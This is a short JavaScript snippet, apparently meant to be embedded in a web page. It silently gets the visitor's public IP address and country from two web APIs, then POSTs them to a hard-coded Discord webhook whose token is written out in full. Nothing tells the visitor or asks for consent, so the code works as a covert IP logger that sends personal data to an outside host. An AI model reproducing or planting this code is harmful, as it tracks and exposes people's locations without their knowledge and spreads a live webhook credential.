var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.ipify.org/?format=json', true);
xhr.onload = function() {
    if (this.status == 200) {
        var ip = JSON.parse(this.responseText).ip;
        var countryCode = '';
        var countryName = '';
        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', 'https://api.ipgeolocation.io/ipgeo?apiKey=your_api_key&ip='+ip, true);
        xhr2.onload = function() {
            if (this.status == 200) {
                countryCode = JSON.parse(this.responseText).country_code2;
                countryName = JSON.parse(this.responseText).country_name;
                var xhr3 = new XMLHttpRequest();
                xhr3.open("POST", "https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0");
                xhr3.setRequestHeader("Content-Type", "application/json");
                xhr3.send(JSON.stringify({content: "IP: "+ip+"\nCountry: "+countryCode+" ("+countryName+")"}));
            }
        };
        xhr2.send();
    }
};
xhr.send();
